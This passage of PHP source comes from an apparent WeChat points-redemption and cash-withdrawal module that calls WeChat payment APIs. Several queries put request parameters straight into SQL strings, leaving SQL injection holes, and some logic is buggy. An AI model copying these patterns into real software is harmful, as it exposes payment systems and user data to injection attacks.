            $mc = mc_fetch($fans['uid'], array('nickname', 'avatar', 'credit1'));
            $fans['credit1'] = $mc['credit1'];
            $fans['avatar'] = $fans['tag']['avatar'];
            $fans['nickname'] = $fans['tag']['nickname'];
        }
        $pid = $_GPC['pid'];
        $weid = $_GPC['i'];
        $poster = pdo_fetch ('select * from ' . tablename ($this -> modulename . "_poster") . " where weid='{$weid}'");
        $credit = 0;
        $creditname = '积分';
        $credittype = 'credit1';
        if ($poster['credit']){
            $creditname = '余额';
            $credittype = 'credit2';
        }
        if ($fans){
            $mc = mc_credit_fetch($fans['uid'], array($credittype));
            $credit = $mc[$credittype];
        }
        $fans1 = pdo_fetchall("select s.openid from " . tablename($this -> modulename . "_share") . " s join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid='{$fans['uid']}' and f.follow=1  and s.openid<>''", array(), 'openid');
        $count = count($fans1);
        if ($fans1){
            $count2 = pdo_fetchcolumn("select count(*) from " . tablename($this -> modulename . "_share") . " s  join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid in (" . implode(',', array_keys($fans1)) . ") and f.follow=1");
        }
        if (empty($count2)){
            $count2 = 0;
        }
        $sumcount = $count;
        $is_follow = true;
        $setting = $this -> module['config'];
        if(empty($setting['style'])){
            $mbstyle = 'style1';
        }else{
            $mbstyle = $setting['style'];
        }
        include $this -> template('goods/' . $mbstyle . '/goods');
    }
    public function doMobileFillInfo(){
        global $_W, $_GPC;
        checkauth();
        $cfg = $this -> module['config'];
        $memberid = intval($_GPC['memberid']);
        $goods_id = intval($_GPC['goods_id']);
        $fans = fans_search($_W['fans']['from_user']);
        $goods_info = pdo_fetch("SELECT * FROM " . tablename($this -> table_goods) . " WHERE goods_id = $goods_id AND weid = '{$_W['weid']}'");
        $ips = $this -> getIp();
        $ip = $this -> GetIpLookup($ips);
        $province = $ip['province'];
        $city = $ip['city'];
        $district = $ip['district'];
        $mbstyle = 'style1';
        include $this -> template('goods/' . $mbstyle . '/fillinfo');
    }
    public function doMobileRequest(){
        global $_W, $_GPC;
        $cfg = $this -> module['config'];
        $ad = pdo_fetchall("SELECT * FROM " . tablename($this -> table_ad) . " WHERE weid = '{$_W['weid']}' order by id desc");
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        if (!strpos($userAgent, 'MicroMessenger')){
            message('请使用微信浏览器打开！');
            $openid = 'oUvXSsv6hNi7wdmd5uWQUTS4vJTY';
            $fans = pdo_fetch("select * from ims_mc_mapping_fans where openid='{$openid}'");
        }else{
            load() -> model('mc');
            $fans = $_W['fans'];
            $mc = mc_fetch($fans['uid'], array('nickname', 'avatar', 'credit1'));
            $fans['credit1'] = $mc['credit1'];
            $fans['avatar'] = $fans['tag']['avatar'];
            $fans['nickname'] = $fans['tag']['nickname'];
        }
        $pid = $_GPC['pid'];
        $weid = $_GPC['i'];
        $poster = pdo_fetch ('select * from ' . tablename ($this -> modulename . "_poster") . " where weid='{$weid}'");
        $credit = 0;
        $creditname = '积分';
        $credittype = 'credit1';
        if ($poster['credit']){
            $creditname = '余额';
            $credittype = 'credit2';
        }
        if ($fans){
            $mc = mc_credit_fetch($fans['uid'], array($credittype));
            $credit = $mc[$credittype];
        }
        $fans1 = pdo_fetchall("select s.openid from " . tablename($this -> modulename . "_share") . " s join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid='{$fans['uid']}' and f.follow=1 and s.openid<>''", array(), 'openid');
        $count = count($fans1);
        if ($fans1){
            $count2 = pdo_fetchcolumn("select count(*) from " . tablename($this -> modulename . "_share") . " s  join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid in (" . implode(',', array_keys($fans1)) . ") and f.follow=1");
        }
        if (empty($count2)){
            $count2 = 0;
        }
        $sumcount = $count;
        $goods_list = pdo_fetchall("SELECT * FROM " . tablename($this -> table_goods) . " as t1," . tablename($this -> table_request) . "as t2 WHERE t1.goods_id=t2.goods_id AND from_user='{$_W['fans']['from_user']}' AND t1.weid = '{$_W['weid']}' ORDER BY t2.createtime DESC");
        if(empty($goods_list)){
            $olist = 1;
        }
        $mbstyle = 'style1';
        include $this -> template('goods/' . $mbstyle . '/request');
    }
    public function doWebDhlist(){
        $this -> getsq();
        global $_W, $_GPC;
        $name = $_GPC['name'];
        $pindex = max(1, intval($_GPC['page']));
        $psize = 20;
        if (!empty($name)) $where .= " and (dwnick like '%{$name}%' or dopenid = '{$name}') ";
        $sql = "select * from " . tablename($this -> modulename . "_paylog") . " where uniacid='{$_W['uniacid']}' {$where} order BY dtime DESC LIMIT " . ($pindex - 1) * $psize . ",{$psize}";
        $list = pdo_fetchall($sql);
        $total = pdo_fetchcolumn($sql);
        $pager = pagination($total, $pindex, $psize);
        include $this -> template('dhlist');
    }
    public function doWebTxlist(){
        $this -> getsq();
        global $_W, $_GPC;
        $name = $_GPC['name'];
        $pindex = max(1, intval($_GPC['page']));
        $psize = 20;
        if (!empty($name)) $where .= " and (dwnick like '%{$name}%' or dopenid = '{$name}') ";
        $sql = "select * from " . tablename($this -> modulename . "_tixianlog") . " where uniacid='{$_W['uniacid']}' {$where} order BY dtime DESC LIMIT " . ($pindex - 1) * $psize . ",{$psize}";
        $list = pdo_fetchall($sql);
        $total = pdo_fetchcolumn($sql);
        $pager = pagination($total, $pindex, $psize);
        include $this -> template('txlist');
    }
    public function doMobileTixian(){
        global $_W, $_GPC;
        $weid = $_W['weid'];
        $cfg = $this -> module['config'];
        if(empty($cfg['txon'])){
            echo '提现功能已关闭！请咨询管理员!';
            exit;
        }
        if($cfg['jiequan'] == 1){
            load() -> model('account');
            $cfg = $this -> module['config'];
            if(empty($_GPC['wdl_jifenbao_openid' . $weid])){
                if(empty($_GPC['openid'])){
                    $callback = urlencode($_W['siteroot'] . 'app' . str_replace("./", "/", $this -> createMobileurl('oauth', array('weid' => $weid, 'dw' => 'tixian'))));
                    $forward = "https://open.weixin.qq.com/connect/oauth2/authorize?appid=" . $cfg['appid'] . "&redirect_uri={$callback}&response_type=code&scope=snsapi_userinfo&state=1#wechat_redirect";
                    header('location:' . $forward);
                    exit();
                }else{
                    $openid = $_GPC['wdl_jifenbao_openid' . $weid];
                }
            }
        }
        if(!empty($_GPC['wdl_jifenbao_openid' . $weid])){
            $openid = $_GPC['wdl_jifenbao_openid' . $weid];
        }elseif(!empty($_GPC['openid'])){
            $openid = $_GPC['openid'];
        }
        $ips = $this -> getIp();
        $ip = $this -> GetIpLookup($ips);
        $province = $ip['province'];
        $city = $ip['city'];
        $district = $ip['district'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        if (!strpos($userAgent, 'MicroMessenger')){
            message('请使用微信浏览器打开！');
        }else{
            load() -> model('mc');
            $fans = $_W['fans'];
            $mc = mc_fetch($fans['uid'], array('nickname', 'avatar', 'credit1', 'credit2', 'uid', 'uniacid'));
            $fans['credit1'] = $mc['credit1'];
            $fans['credit2'] = $mc['credit2'];
            $fans['avatar'] = $fans['tag']['avatar'];
            $fans['nickname'] = $fans['tag']['nickname'];
            $fans['uid'] = $mc['uid'];
            $fans['uniacid'] = $mc['uniacid'];
        }
        $pid = $_GPC['pid'];
        $weid = $_GPC['i'];
        $poster = pdo_fetch ('select * from ' . tablename ($this -> modulename . "_poster") . " where weid='{$weid}'");
        $credit = 0;
        $creditname = '积分';
        $credittype = 'credit2';
        if ($poster['credit']){
            $creditname = '余额';
            $credittype = 'credit2';
        }
        if ($fans){
            $mc = mc_credit_fetch($fans['uid'], array($credittype));
            $credit = $mc[$credittype];
        }
        $fans1 = pdo_fetchall("select s.openid from " . tablename($this -> modulename . "_share") . " s join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid='{$fans['uid']}' and f.follow=1 and s.openid<>''", array(), 'openid');
        $count = count($fans1);
        if ($fans1){
            $count2 = pdo_fetchcolumn("select count(*) from " . tablename($this -> modulename . "_share") . " s  join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid in (" . implode(',', array_keys($fans1)) . ") and f.follow=1");
        }
        if (empty($count2)){
            $count2 = 0;
        }
        $sumcount = $count;
        $txsum = pdo_fetch('select SUM(num) tx from ' . tablename('mc_credits_record') . ' where uniacid=:uniacid and uid=:uid and credittype=:credittype and num<:num', array(':uniacid' => $_W['uniacid'], ':uid' => $fans['uid'], ':credittype' => 'credit2', ':num' => 0));
        $txsum = $txsum['tx'];
        if(empty($txsum)){
            $txsum = '0.00';
        }
        $sql = 'select * from ' . tablename('wdl_jifenbao_member') . ' where weid=:weid AND openid=:openid order by id asc limit 1';
        $member = pdo_fetch($sql, array(':weid' => $_W['weid'], ':openid' => $openid));
        include $this -> template('tixian/tixian');
    }
    public function doMobileTixianpost(){
        global $_W, $_GPC;
        $fans['uid'] = $_GPC['uid'];
        $weid = $_W['uniacid'];
        $dhPay = doubleval($_GPC['dhPay']);
        load() -> model('mc');
        load() -> model('account');
        $cfg = $this -> module['config'];
        if(empty($cfg['txon'])){
            echo '提现功能已关闭！请咨询管理员!';
            exit;
        }
        $uid = mc_openid2uid($_W['openid']);
        $fans = mc_fetch($uid, array('credit2', 'uid', 'uniacid'));
        if(!$_W['isajax'])die(json_encode(array('success' => false, 'msg' => '非法提交,只能通过网站提交')));
        $share = pdo_fetch("SELECT * FROM " . tablename('wdl_jifenbao_share') . " WHERE weid = :weid and openid=:openid", array(':weid' => $_W['uniacid'], ':openid' => $uid));
        if($share['status'] == 1){
            die(json_encode(array('success' => false, 'msg' => "您的帐号怀疑有作弊嫌疑已被系统拉黑，如没有作弊请联系管理帮您解除操作！")));
        }
        if($dhPay > $fans['credit2']){
            die(json_encode(array('success' => false, 'msg' => "提现金额不能大于当前金额")));
        }elseif($dhPay < $cfg['tx_num']){
            die(json_encode(array('success' => false, 'msg' => "提现金额最低" . $cfg['tx_num'] . "元起")));
        }elseif($dhPay < 1){
            die(json_encode(array('success' => false, 'msg' => "提现金额最低1元起")));
        }elseif($dhPay > 200){
            die(json_encode(array('success' => false, 'msg' => "单次提现金额不能大于200元")));
        }elseif($dhPay < 0){
            die(json_encode(array('success' => false, 'msg' => "请输入正确的金额")));
        }
        $credit2 = pdo_fetch('select * from ' . tablename('mc_credits_record') . ' where uniacid=:uniacid and uid=:uid and credittype=:credittype and remark=:remark  order by createtime desc limit 1', array(':uniacid' => $weid, ':uid' => $uid, ':credittype' => 'credit2', ':remark' => '余额提现红包'));
        $y = date("Y");
        $m = date("m");
        $d = date("d");
        $daytime = mktime(0, 0, 0, $m, $d, $y);
        $member = pdo_fetch ('select * from ' . tablename ($this -> modulename . "_member") . " where weid='{$weid}' and id='{$_GPC['memberid']}' order by id desc");
        $daysum = pdo_fetch('select count(uid) t from ' . tablename('mc_credits_record') . ' where uniacid=:uniacid and uid=:uid and credittype=:credittype and remark=:remark and createtime>:createtime order by createtime desc limit 1', array(':uniacid' => $weid, ':uid' => $uid, ':credittype' => 'credit2', ':remark' => '余额提现红包', ':createtime' => $daytime));
        $day_sum = $daysum['t'];
        $rmbsum = pdo_fetch('select SUM(num) tx from ' . tablename('mc_credits_record') . ' where uniacid=:uniacid and uid=:uid and credittype=:credittype and remark=:remark and num<:num order by createtime desc limit 1', array(':uniacid' => $weid, ':uid' => $uid, ':credittype' => 'credit2', ':remark' => '余额提现红包', ':num' => 0));
        $rmb_sum = $rmbsum['tx'] * -1;
        $rmbtxsum = pdo_fetch('select count(id) t from ' . tablename('wdl_jifenbao_tixianlog') . ' where uniacid=:uniacid and dopenid=:dopenid and dtime>:dtime order by dtime desc limit 1', array(':uniacid' => $weid, ':dopenid' => $member['openid'], ':dtime' => $daytime));
        $cfg['day_num'];
        $cfg['rmb_num'];
        if(!empty($cfg['day_num'])){
            if(intval($day_sum) >= intval($cfg['day_num'])){
                die(json_encode(array('success' => false, 'msg' => "1天之内只能兑换" . $cfg['day_num'] . "次，明天在来兑换吧！")));
                exit;
            }
        }
        if(!empty($cfg['day_num'])){
            if(intval($txrmb_sum) >= intval($cfg['day_num'])){
                die(json_encode(array('success' => false, 'msg' => "1天之内只能兑换" . $cfg['day_num'] . "次，明天在来兑换吧！")));
                exit;
            }
        }
        if(!empty($cfg['rmb_num'])){
            if($dhPay >= $cfg['rmb_num']){
                die(json_encode(array('success' => false, 'msg' => "每个粉丝最多只能提现" . $cfg['rmb_num'] . "元")));
                exit;
            }
            if(doubleval($rmb_sum) >= doubleval($cfg['rmb_num'])){
                die(json_encode(array('success' => false, 'msg' => "每个粉丝最多只能提现" . $cfg['rmb_num'] . "元")));
                exit;
            }
        }
        load() -> func('logging');
        if(!$cfg['mchid']){
            die(json_encode(array("success" => 4, "msg" => "商家未开启微信支付功能,请联系商家开启后申请兑换")));
        }
        $dtotal_amount = $dhPay * 100;
        if($_W['account']['level'] == 4){
            $member['openid'] = $_W['openid'];
        }
        if($cfg['txtype'] == 0){
            $msg = $this -> post_txhb($cfg, $member['openid'], $dtotal_amount, '1');
        }elseif($cfg['txtype'] == 1){
            $msg = $this -> post_qyfk($cfg, $member['openid'], $dtotal_amount, '1');
        }
        if($msg['message'] == 'success'){
            mc_credit_update($fans['uid'], 'credit2', - $dhPay, array($fans['uid'], '余额提现红包', 'tiger_youzan'));
            pdo_insert('wdl_jifenbao_tixianlog', array("uniacid" => $_W["uniacid"], "dwnick" => $_W['fans']['nickname'], "dopenid" => $member['openid'], "dtime" => time(), "dcredit" => $dhPay, "dtotal_amount" => $dtotal_amount, "dmch_billno" => $mch_billno, "dissuccess" => $msg['dissuccess'], "dresult" => $msg['message']));
            die(json_encode(array("success" => 1, "msg" => '提现成功,请到微信窗口查收！')));
        }else{
            die(json_encode(array("success" => 4, "msg" => $msg['message'])));
        }
    }
    public function doMobileGoodpost(){
        global $_W, $_GPC;
        if(!$_W['isajax'])die(json_encode(array('success' => false, 'msg' => '非法提交,只能通过网站提交')));
        $goods_id = intval($_GPC['goods_id']);
        $type = intval($_GPC['typea']);
        if (!empty($_GPC['goods_id'])){
            $fans = fans_search($_W['fans']['from_user'], array('realname', 'mobile', 'residedist', 'alipay', 'credit1', 'credit2', 'vip', 'uniacid', 'uid'));
            $share = pdo_fetch("SELECT * FROM " . tablename('wdl_jifenbao_share') . " WHERE weid = :weid and openid=:openid", array(':weid' => $_W['uniacid'], ':openid' => $fans['uid']));
            if($share['status'] == 1){
                die(json_encode(array('success' => false, 'msg' => "您的帐号怀疑有作弊嫌疑已被系统拉黑，如没有作弊请联系管理帮您解除操作！")));
            }
            $goods_info = pdo_fetch("SELECT * FROM " . tablename($this -> table_goods) . " WHERE goods_id = $goods_id AND weid = '{$_W['weid']}'");
            $y = date("Y");
            $m = date("m");
            $d = date("d");
            $daysum = mktime(0, 0, 0, $m, $d, $y);
            $goods_request = pdo_fetch("SELECT count(*) sn FROM " . tablename($this -> table_request) . " WHERE goods_id = $goods_id AND createtime>" . $daysum . " and weid = '{$_W['weid']}' and from_user = '{$_W['fans']['from_user']}'");
            if(!empty($goods_info['day_sum'])){
                if($goods_request['sn'] >= $goods_info['day_sum']){
                    die(json_encode(array('success' => false, 'msg' => "每个用户1天只能兑换" . $goods_info['day_sum'] . "次,\n明天在来兑换吧！")));
                }
            }
            if ($goods_info['amount'] <= 0){
                die(json_encode(array('success' => false, 'msg' => "商品已经兑空，请重新选择商品！")));
            }
            if (intval($goods_info['vip_require']) > $fans['vip']){
                die(json_encode(array('success' => false, 'msg' => "您的VIP级别不够，无法参与本项兑换，试试其它的吧。")));
            }
            $min_idle_time = empty($goods_info['min_idle_time']) ? 0 : $goods_info['min_idle_time'] * 60;
            $replicated = pdo_fetch("SELECT * FROM " . tablename($this -> table_request) . "  WHERE goods_id = $goods_id AND weid = '{$_W['weid']}' AND from_user = '{$_W['fans']['from_user']}' AND " . TIMESTAMP . " - createtime < {$min_idle_time}");
            if (!empty($replicated)){
                $last_time = date('H:i:s', $replicated['createtime']);
                die(json_encode(array('success' => false, 'msg' => "{$goods_info['min_idle_time']}分钟内不能重复兑换相同物品")));
            }
            if ($goods_info['per_user_limit'] > 0){
                $goods_limit = pdo_fetch("SELECT count(*) as per_user_limit FROM " . tablename($this -> table_request) . "  WHERE goods_id = $goods_id AND weid = '{$_W['weid']}' AND from_user = '{$_W['fans']['from_user']}'");
                $cfg = $this -> module['config'];
                if(!empty($cfg['towurl'])){
                    if ($goods_limit['per_user_limit'] >= 1){
                        die(json_encode(array('success' => 8, 'towurl' => $cfg['towurl'], 'msg' => "每个用户只可以兑换一次红包 联系客服获取更多兑换机会!")));
                    }
                }
                if ($goods_limit['per_user_limit'] >= $goods_info['per_user_limit']){
                    die(json_encode(array('success' => false, 'msg' => "本商品每个用户最多可兑换" . $goods_info['per_user_limit'] . "件,试试兑换其他奖品吧！")));
                }
            }
            if ($fans['credit1'] < $goods_info['cost']){
                die(json_encode(array('success' => false, 'msg' => "积分不足, 请重新选择商品")));
            }
            if (true){
                $data = array('amount' => $goods_info['amount'] - 1);
                pdo_update($this -> table_goods, $data, array('weid' => $_W['weid'], 'goods_id' => $goods_id));
                $data = array('realname' => ("" == $fans['realname'])?$_GPC['realname']:$_W['fans']['nickname'], 'mobile' => ("" == $fans['mobile'])?$_GPC['mobile']:$fans['mobile'], 'residedist' => ("" == $fans['residedist'])?$_GPC['residedist']:$fans['residedist'], 'alipay' => ("" == $fans['alipay'])?$_GPC['alipay']:$fans['alipay'],);
                fans_update($_W['fans']['from_user'], $data);
                $data = array('weid' => $_W['weid'], 'from_user' => $_W['fans']['from_user'], 'from_user_realname' => $_W['fans']['nickname'], 'realname' => $_GPC['realname'], 'mobile' => $_GPC['mobile'], 'residedist' => $_GPC['residedist'], 'alipay' => $_GPC['alipay'], 'note' => $_GPC['note'], 'goods_id' => $goods_id, 'price' => $goods_info['price'], 'cost' => $goods_info['cost'], 'image' => $_GPC['image'], 'createtime' => TIMESTAMP);
                if ($goods_info['cost'] > $fans['credit1']){
                    die(json_encode(array('success' => false, 'msg' => "系统出现未知错误，请重试或与管理员联系")));
                }
                $kjfabc = $data['cost'];
                $kjfabc1 = $data['price'] * 100;
                if($type == 7){
                    if(empty($goods_info['cardid'])){
                    }else{
                        $cardinfo = $this -> sendcardpost($_W['openid'], $goods_info['cardid']);
                        if($type == 7){
                            $data['status'] = 'done';
                        }
                        pdo_insert($this -> table_request, $data);
                        mc_credit_update($fans['uid'], 'credit1', - $kjfabc, array($fans['uid'], '礼品兑换:' . $goods_info['title']));
                        die(json_encode(array('success' => true, 'msg' => "领取成功，请到公众号界面领取!")));
                    }
                    exit;
                }
                if($type == 5 || $type == 8){
                    if(($goods_info['price'] * 100) < 100){
                        die(json_encode(array("success" => 4, "msg" => "最少1元起兑换")));
                    }
                    if(($goods_info['price'] * 100) > 20000){
                        die(json_encode(array("success" => 4, "msg" => "单次最多不能超过200元红包")));
                    }
                    load() -> model('mc');
                    load() -> func('logging');
                    load() -> model('account');
                    $cfg = $this -> module['config'];
                    $member = pdo_fetch ('select * from ' . tablename ($this -> modulename . "_member") . " where weid='{$_W['weid']}' and id='{$_GPC['memberid']}' order by id desc");
                    $set = pdo_fetch('select * from ' . tablename('wdl_jifenbao_set') . ' where weid=:weid order BY id DESC LIMIT 1', array(':weid' => $_W['weid']));
                    if(($goods_info['price'] * 100) > ($set['hbsum'] * 100)){
                        if(!empty($set['hbtext'])){
                            die(json_encode(array("success" => 4, "msg" => $set['hbtext'])));
                        }
                    }
                    if(!$cfg['mchid']){
                        die(json_encode(array("success" => 4, "msg" => "商家未开启微信支付功能,请联系商家开启后申请兑换")));
                    }
                    if($_W['account']['level'] == 4){
                        $member['openid'] = $_W['openid'];
                    }
                    $dtotal_amount = $kjfabc * 1;
                    $msgs = '兑换成功，我们会在24小时之内给你审核发红包的哦，请耐心等待！';
                    if($goods_info['shtype'] == 1){
                        if($cfg['txtype'] == 0){
                            $msg = $this -> post_txhb($cfg, $member['openid'], $kjfabc1, $desc);
                        }elseif($cfg['txtype'] == 1){
                            $msg = $this -> post_qyfk($cfg, $member['openid'], $kjfabc1, $desc);
                        }
                        $msgs = '兑换成功,请到微信窗口查收！';
                        $data['status'] = 'done';
                        if($msg['message'] == 'success'){
                            pdo_insert($this -> table_request, $data);
                            mc_credit_update($fans['uid'], 'credit1', - $kjfabc, array($fans['uid'], '兑换:' . $goods_info['title']));
                            $dhdata = array("uniacid" => $_W["uniacid"], "dwnick" => $_W['fans']['nickname'], "dopenid" => $member['openid'], "dtime" => time(), "dcredit" => $kjfabc, "dtotal_amount" => $kjfabc1, "dmch_billno" => $mch_billno, "dissuccess" => $msg['dissuccess'], "dresult" => $msg['message']);
                            pdo_insert($this -> modulename . "_paylog", $dhdata);
                            die(json_encode(array("success" => 1, "msg" => $msgs)));
                        }else{
                            die(json_encode(array("success" => 4, "msg" => $msg['message'])));
                        }
                    }else{
                        $msgs = '亲！我们会在24小时之内给你审核发红包的哦，请耐心等待！';
                        $data['openid'] = $member['openid'];
                        pdo_insert($this -> table_request, $data);
                        mc_credit_update($fans['uid'], 'credit1', - $kjfabc, array($fans['uid'], '兑换:' . $goods_info['title']));
                        die(json_encode(array("success" => 1, "msg" => $msgs)));
                    }
                    exit;
                }
                if($type == 4){
                    $data['status'] = 'done';
                }
                pdo_insert($this -> table_request, $data);
                mc_credit_update($fans['uid'], 'credit1', - $kjfabc, array($fans['uid'], '礼品兑换:' . $goods_info['title']));
                die(json_encode(array('success' => true, 'msg' => "扣除您{$goods_info['cost']}积分。")));
            }
        }else{
            message('请选择要兑换的商品！', $this -> createMobileUrl('goods', array('weid' => $_W['weid'])), 'error');
        }
    }
    public function doMobileDoneExchange(){
        global $_W, $_GPC;
        $data = array('status' => 'done');
        $id = intval($_GPC['id']);
        $row = pdo_fetch("SELECT id FROM " . tablename($this -> table_request) . " WHERE id = :id", array(':id' => $id));
        if (empty($row)){
            message('抱歉，编号为' . $id . '的兑换请求不存在或是已经被删除！');
        }
        pdo_update($this -> table_request, $data, array('id' => $id));
        message('兑换成功！！', referer(), 'success');
    }
    function post_txhb($cfg, $openid, $dtotal_amount, $desc){
        global $_W;
        if(!empty($desc)){
            $fans = mc_fetch($_W['openid']);
            $dtotal = $dtotal_amount / 100;
            if($dtotal > $fans['credit2']){
                $ret['code'] = -1;
                $ret['dissuccess'] = 0;
                $ret['message'] = '余额不足';
                return $ret;
                exit;
            }
        }
        $root = IA_ROOT . '/attachment/wdl_jifenbao/cert/' . $_W['uniacid'] . '/';
        $ret = array();
        $ret['code'] = 0;
        $ret['message'] = "success";
        $url = 'https://api.mch.weixin.qq.com/mmpaymkttransfers/sendredpack';
        $pars = array();
        $pars['nonce_str'] = random(32);
        $pars['mch_billno'] = random(10) . date('Ymd') . random(3);
        $pars['mch_id'] = $cfg['mchid'];
        $pars['wxappid'] = $cfg['appid'];
        $pars['nick_name'] = $_W['account']['name'];
        $pars['send_name'] = $_W['account']['name'];
        $pars['re_openid'] = $openid;
        $pars['total_amount'] = $dtotal_amount;
        $pars['min_value'] = $dtotal_amount;
        $pars['max_value'] = $dtotal_amount;
        $pars['total_num'] = 1;
        $pars['wishing'] = '提现红包成功!';
        $pars['client_ip'] = $cfg['client_ip'];
        $pars['act_name'] = '兑换红包';
        $pars['remark'] = "来自" . $_W['account']['name'] . "的红包";
        ksort($pars, SORT_STRING);
        $string1 = '';
        foreach($pars as $k => $v){
            $string1 .= "{$k}={$v}&";
        }
        $string1 .= "key={$cfg['apikey']}";
        $pars['sign'] = strtoupper(md5($string1));
        $xml = array2xml($pars);
        $extras = array();
        $extras['CURLOPT_CAINFO'] = $root . 'rootca.pem';
        $extras['CURLOPT_SSLCERT'] = $root . 'apiclient_cert.pem';
        $extras['CURLOPT_SSLKEY'] = $root . 'apiclient_key.pem';
        load() -> func('communication');
        $procResult = null;
        $resp = ihttp_request($url, $xml, $extras);
        if(is_error($resp)){
            $procResult = $resp["message"];
            $ret['code'] = -1;
            $ret['dissuccess'] = 0;
            $ret['message'] = $procResult;
            return $ret;
        }else{
            $xml = '<?xml version="1.0" encoding="utf-8"?>' . $resp['content'];
            $dom = new DOMDocument();
            if($dom -> loadXML($xml)){
                $xpath = new DOMXPath($dom);
                $code = $xpath -> evaluate('string(//xml/return_code)');
                $result = $xpath -> evaluate('string(//xml/result_code)');
                if(strtolower($code) == 'success' && strtolower($result) == 'success'){
                    $ret['code'] = 0;
                    $ret['dissuccess'] = 1;
                    $ret['message'] = "success";
                    return $ret;
                }else{
                    $error = $xpath -> evaluate('string(//xml/err_code_des)');
                    $ret['code'] = -2;
                    $ret['dissuccess'] = 0;
                    $ret['message'] = $error;
                    return $ret;
                }
            }else{
                $ret['code'] = -3;
                $ret['dissuccess'] = 0;
                $ret['message'] = "3error3";
                return $ret;
            }
        }
    }
    public function post_qyfk($cfg, $openid, $amount, $desc){
        global $_W;
        if(!empty($desc)){
            $fans = mc_fetch($_W['openid']);
            $dtotal = $amount / 100;
            if($dtotal > $fans['credit2']){
                $ret['code'] = -1;
                $ret['dissuccess'] = 0;
                $ret['message'] = '余额不足';
                return $ret;
                exit;
            }
        }
        $root = IA_ROOT . '/attachment/wdl_jifenbao/cert/' . $_W['uniacid'] . '/';
        $ret = array();
        $ret['code'] = 0;
        $ret['message'] = "success";
        $ret['amount'] = $amount;
        $url = 'https://api.mch.weixin.qq.com/mmpaymkttransfers/promotion/transfers';
        $pars = array();
        $pars['mch_appid'] = $cfg['appid'];
        $pars['mchid'] = $cfg['mchid'];
        $pars['nonce_str'] = random(32);
        $pars['partner_trade_no'] = random(10) . date('Ymd') . random(3);
        $pars['openid'] = $openid;
        $pars['check_name'] = "NO_CHECK";
        $pars['amount'] = $amount;
        $pars['desc'] = "来自" . $_W['account']['name'] . "的提现";
        $pars['spbill_create_ip'] = $cfg['client_ip'];
        ksort($pars, SORT_STRING);
        $string1 = '';
        foreach($pars as $k => $v){
            $string1 .= "{$k}={$v}&";
        }
        $string1 .= "key={$cfg['apikey']}";
        $pars['sign'] = strtoupper(md5($string1));
        $xml = array2xml($pars);
        $extras = array();
        $extras['CURLOPT_CAINFO'] = $root . 'rootca.pem';
        $extras['CURLOPT_SSLCERT'] = $root . 'apiclient_cert.pem';
        $extras['CURLOPT_SSLKEY'] = $root . 'apiclient_key.pem';
        load() -> func('communication');
        $procResult = null;
        $resp = ihttp_request($url, $xml, $extras);
        if(is_error($resp)){
            $procResult = $resp['message'];
            $ret['code'] = -1;
            $ret['dissuccess'] = 0;
            $ret['message'] = "-1:" . $procResult;
            return $ret;
        }else{
            $xml = '<?xml version="1.0" encoding="utf-8"?>' . $resp['content'];
            $dom = new DOMDocument();
            if($dom -> loadXML($xml)){
                $xpath = new DOMXPath($dom);
                $code = $xpath -> evaluate('string(//xml/return_code)');
                $result = $xpath -> evaluate('string(//xml/result_code)');
                if(strtolower($code) == 'success' && strtolower($result) == 'success'){
                    $ret['code'] = 0;
                    $ret['dissuccess'] = 1;
                    $ret['message'] = "success";
                    return $ret;
                }else{
                    $error = $xpath -> evaluate('string(//xml/err_code_des)');
                    $ret['code'] = -2;
                    $ret['dissuccess'] = 0;
                    $ret['message'] = "-2:" . $error;
                    return $ret;
                }
            }else{
                $ret['code'] = -3;
                $ret['dissuccess'] = 0;
                $ret['message'] = "error response";
                return $ret;
            }
        }
    }
    public function doWebDownloade(){
        global $_W;
        require_once IA_ROOT . '/addons/wdl_jifenbao/lib/excel.php';
        $filename = '兑换记录_' . date('YmdHis') . '.csv';
        $exceler = new Tiger_Export();
        $exceler -> charset('UTF-8');
        $exceler -> setFileName($filename);
        $excel_title = array('粉丝昵称', '粉丝OPENID', '真实姓名', '手机号码', '地址', '商品名称', '价格', '消耗积分', '兑换时间');
        $exceler -> setTitle($excel_title);
        $excel_data = array();
        $sql = "SELECT t1.*,t2.title FROM " . tablename($this -> table_request) . "as t1 LEFT JOIN " . tablename($this -> table_goods) . " as t2 " . " ON  t2.goods_id=t1.goods_id AND t2.weid=t1.weid AND t2.weid='{$_W['weid']}' WHERE t1.weid = '{$_W['weid']}' ORDER BY t1.createtime DESC";
        $list = pdo_fetchall($sql);
        load() -> model('mc');
        foreach ($list as $value){
            $mc = mc_fetch($value['uid'], array('nickname'));
            $data = array();
            $data[] = $value['from_user_realname'];
            $data[] = $value['from_user'];
            $data[] = $value['realname'];
            $data[] = $value['mobile'];
            $data[] = $value['residedist'];
            $data[] = $value['title'];
            $data[] = $value['price'];
            $data[] = $value['cost'];
            $data[] = date("Y-m-d H:i:s", $value["createtime"]);
            $excel_data[] = $data;
            $allsum++;
        }
        $allsum = 0;
        $excel_data[] = array('总数目:', $allsum);
        $exceler -> setContent($excel_data);
        $exceler -> export();
        exit;
    }
    private function getAccountLevel(){
        global $_W;
        load() -> classs('weixin.account');
        $accObj = WeixinAccount :: create($_W['uniacid']);
        $account = $accObj -> account;
        return $account['level'];
    }
    public function doWebQingkong(){
        global $_W, $_GPC;
        $weid = $_W['uniacid'];
        $pid = $_GPC['pid'];
        pdo_delete('qrcode', array('uniacid' => $weid));
        if ($pid){
            $shares = pdo_fetchall('select id from ' . tablename($this -> modulename . "_share") . " where weid='{$weid}'");
            foreach ($shares as $value){
                @unlink("../addons/wdl_jifenbao/qrcode/mposter{$value['id']}.jpg");
            }
            die('清空成功');
        }
    }
    public function doMobileDuibagoods(){
        global $_W, $_GPC;
        include 'duiba.php';
        $cfg = $this -> module['config'];
        if(empty($cfg['AppKey'])){
            exit;
        }
        checkauth();
        load() -> model('mc');
        $uid = mc_openid2uid($_W['openid']);
        $credit = mc_credit_fetch($uid);
        $crdeidt = strval(intval($credit['credit1']));
